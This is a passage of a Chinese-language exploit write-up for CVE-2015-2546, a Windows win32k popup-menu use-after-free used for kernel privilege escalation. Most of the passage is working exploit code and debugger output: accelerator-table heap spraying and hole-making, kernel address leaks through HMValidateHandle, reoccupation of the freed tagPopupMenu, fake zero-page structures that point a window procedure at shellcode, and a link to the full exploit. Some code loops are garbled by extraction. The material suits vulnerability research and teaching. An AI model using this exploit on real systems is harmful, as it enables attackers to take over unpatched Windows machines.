    for (int i = 0; i pKernel;
        printf("[+] Create Accelerator pKernelAddress at : 0x%p\n", pAcceleratorTable[i]);
    }
然后我们在通过释放双数的加速键表实现空隙，为了让我们的地址更可控
    // 释放双数的加速键表,制造空洞
    for (int i = 2; i  !pool fe9e9e28
    Pool page fe9e9e28 region is Paged session pool
     fe9e9000 size:   c0 previous size:    0  (Allocated)  Gla4
     fe9e90c0 size:    8 previous size:   c0  (Free)       ....
     fe9e90c8 size:   a0 previous size:    8  (Allocated)  Gla8
     fe9e9168 size:   d0 previous size:   a0  (Allocated)  Gpff
     fe9e9238 size:  2d0 previous size:   d0  (Allocated)  Ttfd
     fe9e9508 size:   50 previous size:  2d0  (Allocated)  Ttfd
     fe9e9558 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e95a0 size:   18 previous size:   48  (Allocated)  Ggls
     fe9e95b8 size:   50 previous size:   18  (Allocated)  Ttfd
     fe9e9608 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e9650 size:   70 previous size:   48  (Allocated)  Ghab
     fe9e96c0 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e96d0 size:   70 previous size:   10  (Allocated)  Ghab
     fe9e9740 size:   78 previous size:   70  (Allocated)  Gpfe
     fe9e97b8 size:   70 previous size:   78  (Allocated)  Ghab
     fe9e9828 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e9838 size:   10 previous size:   10  (Allocated)  Glnk
     fe9e9848 size:   70 previous size:   10  (Allocated)  Ghab
     fe9e98b8 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e98c8 size:   78 previous size:   10  (Allocated)  Gpfe
     fe9e9940 size:   d0 previous size:   78  (Allocated)  Gpff
     fe9e9a10 size:  2d0 previous size:   d0  (Allocated)  Ttfd
     fe9e9ce0 size:   50 previous size:  2d0  (Allocated)  Ttfd
     fe9e9d30 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e9d78 size:   10 previous size:   48  (Allocated)  Glnk
     fe9e9d88 size:   18 previous size:   10  (Allocated)  Ggls
     fe9e9da0 size:   18 previous size:   18  (Allocated)  Ggls
     fe9e9db8 size:   10 previous size:   18  (Allocated)  Glnk
     fe9e9dc8 size:    8 previous size:   10  (Free)       Ggls
     fe9e9dd0 size:   20 previous size:    8  (Allocated)  Usse Process: 87aa9d40
     fe9e9df0 size:   30 previous size:   20  (Free)       Gh14
    *fe9e9e20 size:   40 previous size:   30  (Free ) *Usac Process: 8678b990
            Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
     fe9e9e60 size:   c0 previous size:   40  (Allocated)  Gla4
     fe9e9f20 size:   70 previous size:   c0  (Allocated)  Ghab
     fe9e9f90 size:   70 previous size:   70  (Allocated)  Ghab
在构造Fake Structure之前我提到了我们需要创建一个窗口，这里我们使用类名为 #32768 的窗口，这个窗口调用 CreateWindowExA
创建窗口后，会自动生成 tagPopupMenu ，我们可以获取返回值通过 pself 指针泄露我们的内核地址，泄露的方法就是通过判断 jmp
的硬编码，获取内核地址，我就不详细讲解了，看代码应该可以看懂
    BOOL FindHMValidateHandle() {
        HMODULE hUser32 = LoadLibraryA("user32.dll");
        if (hUser32 == NULL) {
            printf("[+] Failed to load user32");
            return FALSE;
        }
        BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
        if (pIsMenu == NULL) {
            printf("[+] Failed to find location of exported function 'IsMenu' within user32.dll\n");
            return FALSE;
        }
        unsigned int uiHMValidateHandleOffset = 0;
        for (unsigned int i = 0; i pSelf;
    printf("[+] tagWnd2 at pKernel Address : 0x%p\n", tagWND2->pSelf);
这样我们就可以截断第一处的消息并且绕过`IsWindowBeingDestroyed`的检验了，剩下两处的检验我们进行如下构造，对于 0x1E5
类型的消息我们只需要返回正确的值绕过判断即可，这里是0x10，对于 1F0h
类型的消息我们首先销毁第二个窗口，导致tagPopupMenu被释放，然后再用加速键表进行占用，这样我们后面调用xxxMNHideNextHierarchy函数就会引用`tagACCEL+0xc`的内容，然而这个内容我们可以控制
    LRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        LPACCEL lpAccel;
        // 处理 1EB 的消息
        if (uMsg == 0x1EB)
        {
            return (LONG)hwnd2;
        }
        else if (uMsg == 0x1F0)
        {
            if (hwnd2 != NULL)
            {
                // #32768 窗口进行销毁,tagPopupMenu被释放
                DestroyWindow(hwnd2);
                // Accelerator 占用销毁的位置
                lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 0x5);
                for (int i = 0; i  !pool fe9e9e28
    Pool page fe9e9e28 region is Paged session pool
     fe9e9000 size:   c0 previous size:    0  (Allocated)  Gla4
     fe9e90c0 size:    8 previous size:   c0  (Free)       ....
     fe9e90c8 size:   a0 previous size:    8  (Allocated)  Gla8
     fe9e9168 size:   d0 previous size:   a0  (Allocated)  Gpff
     fe9e9238 size:  2d0 previous size:   d0  (Allocated)  Ttfd
     fe9e9508 size:   50 previous size:  2d0  (Allocated)  Ttfd
     fe9e9558 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e95a0 size:   18 previous size:   48  (Allocated)  Ggls
     fe9e95b8 size:   50 previous size:   18  (Allocated)  Ttfd
     fe9e9608 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e9650 size:   70 previous size:   48  (Allocated)  Ghab
     fe9e96c0 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e96d0 size:   70 previous size:   10  (Allocated)  Ghab
     fe9e9740 size:   78 previous size:   70  (Allocated)  Gpfe
     fe9e97b8 size:   70 previous size:   78  (Allocated)  Ghab
     fe9e9828 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e9838 size:   10 previous size:   10  (Allocated)  Glnk
     fe9e9848 size:   70 previous size:   10  (Allocated)  Ghab
     fe9e98b8 size:   10 previous size:   70  (Allocated)  Glnk
     fe9e98c8 size:   78 previous size:   10  (Allocated)  Gpfe
     fe9e9940 size:   d0 previous size:   78  (Allocated)  Gpff
     fe9e9a10 size:  2d0 previous size:   d0  (Allocated)  Ttfd
     fe9e9ce0 size:   50 previous size:  2d0  (Allocated)  Ttfd
     fe9e9d30 size:   48 previous size:   50  (Allocated)  Gffv
     fe9e9d78 size:   10 previous size:   48  (Allocated)  Glnk
     fe9e9d88 size:   18 previous size:   10  (Allocated)  Ggls
     fe9e9da0 size:   18 previous size:   18  (Allocated)  Ggls
     fe9e9db8 size:   10 previous size:   18  (Allocated)  Glnk
     fe9e9dc8 size:    8 previous size:   10  (Free)       Ggls
     fe9e9dd0 size:   20 previous size:    8  (Allocated)  Usse Process: 87aa9d40
     fe9e9df0 size:   30 previous size:   20  (Free)       Gh14
    *fe9e9e20 size:   40 previous size:   30  (Allocated) *Uspm Process: 8678b990
            Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup
     fe9e9e60 size:   c0 previous size:   40  (Allocated)  Gla4
     fe9e9f20 size:   70 previous size:   c0  (Allocated)  Ghab
     fe9e9f90 size:   70 previous size:   70  (Allocated)  Ghab
我们在引用的地方下断点发现，这里已经将`tagACCEL+0xc`处的值改为0x5
    3: kd> g
    Breakpoint 2 hit
    win32k!xxxMNHideNextHierarchy+0x2f:
    95e18efd 8b460c          mov     eax,dword ptr [esi+0Ch]
    3: kd> r
    eax=00000005 ebx=fdbdf280 ecx=fdea2e8c edx=8e8b3a50 esi=fdbdf280 edi=00000000
    eip=95e18efd esp=8e8b3a4c ebp=8e8b3a5c iopl=0         nv up ei pl nz na po nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
    win32k!xxxMNHideNextHierarchy+0x2f:
    95e18efd 8b460c          mov     eax,dword ptr [esi+0Ch] ds:0023:fdbdf28c=00000005
我们最后的利用点还是 xxxSendMessageTimeout 函数下面的片段
    loc_95DB94E8:
    push    [ebp+Src]
    push    dword ptr [ebp+UnicodeString]
    push    ebx
    push    esi
    call    dword ptr [esi+60h] ; call ShellCode
    mov     ecx, [ebp+arg_18]
    test    ecx, ecx
    jz      loc_95DB9591
期间我们需要绕过的几处判断，这些地方和CVE-2014-4113很类似
    *(PVOID*)(0xD) = pThreadInfo;               // 0x0D - 0x5 = 0x8   
    *(BYTE*)(0x1B) = (BYTE)4;                   // 0x1B - 0x5 = 0x16, bServerSideWindowProc change!
    *(PVOID*)(0x65) = (PVOID)ShellCode;         // 0x65 - 0x5 = 0x60, lpfnWndProc
最后整合一下思路，完整利用代码参考 =>
[这里](https://github.com/ThunderJie/CVE/tree/master/CVE-2015-2546)
  * 创建一个主窗口，回调函数中发送三次消息，模拟事件到达xxxMNMouseMove函数
  * 堆喷射并制造空洞，泄露内核地址
  * 创建菜单窗口，泄露其地址
  * 零页构造假的结构体
  * 构造回调函数截获消息
  * 调用TrackPopupMenu函数触发漏洞
# 0x03：后记
这个漏洞调试之前最好是先把2014-4113搞定了，这两个漏洞确实很像，整个过程调起来也比较艰辛，Use After
Free的漏洞就需要我们经常使用堆喷的技巧，然后构造假的结构，最后找利用点提权
参考资料:
[+] k0shl师傅的分析：
[+]
百度安全实验室的分析：[http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/](http://xlab.baidu.com/cve-2015-2546：从补丁比对到exploit/)